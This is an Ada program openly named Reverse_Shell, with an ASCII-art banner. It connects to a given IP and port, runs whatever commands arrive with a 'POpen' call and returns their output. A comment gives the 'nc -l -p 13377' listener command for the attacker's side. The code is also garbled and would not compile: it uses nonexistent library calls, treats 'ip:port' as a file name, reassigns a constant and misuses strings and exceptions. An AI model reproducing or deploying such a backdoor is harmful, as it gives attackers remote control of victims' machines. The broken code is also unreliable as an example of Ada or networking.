with Ada.Text_IO;
with Ada.Text_IO; use Ada.Text_IO;
with Ada.Streams.Stream_IO; use Ada.Streams.Stream_IO;

procedure Reverse_Shell is
   We : constant String :=
     "  _____            _      _____          _      " & ASCII.LF &
     " |  __ \          | |    / ____|        | |     " & ASCII.LF &
     " | |__) |___  __ _| |___| |     ___   __| | ___ " & ASCII.LF &
     " |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \" & ASCII.LF &
     " | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/" & ASCII.LF &
     " |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|" & ASCII.LF;

   Client_Ip : String := Ada.Text_IO.Get_Line; -- nc -l -p 13377

   procedure Handle_Connection (Socket : access Ada.Streams.Stream_IO.File_Type) is
      Cmd : String (1 .. 4096);
      Output : String (1 .. 4096);
   begin
      while not End_Of_File (Socket) loop
         Ada.Text_IO.Put (Socket, " $ ");
         Ada.Text_IO.Get_Line (Socket, Cmd);
         Cmd := Trim (Cmd);

         if Cmd = "exit" then
            exit;
         end if;

         declare
            Cmd_Exec : Ada.Text_IO.File_Type;
         begin
            Cmd_Exec := Ada.Text_IO.POpen (Cmd, Ada.Text_IO.In_Mode);
            while not End_Of_File (Cmd_Exec) loop
               Output := Output & Get_Line (Cmd_Exec);
            end loop;
            Ada.Text_IO.Close (Cmd_Exec);
         end;
         
         Ada.Text_IO.Put_Line (Socket, Output);
         Output := "";
      end loop;
   end Handle_Connection;

   Ip : String := "127.0.0.1";  -- Default IP address
   Po : Positive := 13377;      -- Default port

   Socket : aliased Ada.Streams.Stream_IO.File_Type;
begin
   We := We & "Client IP: " & Client_Ip & ASCII.LF;

   begin
      Ip := Get_Command_Argument (1);
   exception
      when others =>
         if Get_Command_Argument_Count = 1 then
            Put_Line ("Please provide the IP address as a command-line argument.");
            return;
         end if;
   end;

   begin
      Po := Positive'Value (Get_Command_Argument (2));
   exception
      when others =>
         if Get_Command_Argument_Count = 2 then
            Put_Line ("Please provide the port as a command-line argument.");
            return;
         end if;
   end;

   begin
      Ada.Text_IO.Open (Socket, Ada.Text_IO.Out_File, Ip & ":" & Positive'Image (Po));
   exception
      when others =>
         Put_Line ("Error: " & Ada.Exceptions.Exception_Message (Ada.Exceptions.Exception_Name (Exception)));
         return;
   end;

   Ada.Text_IO.Put (Socket, We);

   Handle_Connection (Socket'Access);

   Ada.Text_IO.Close (Socket);
end Reverse_Shell;
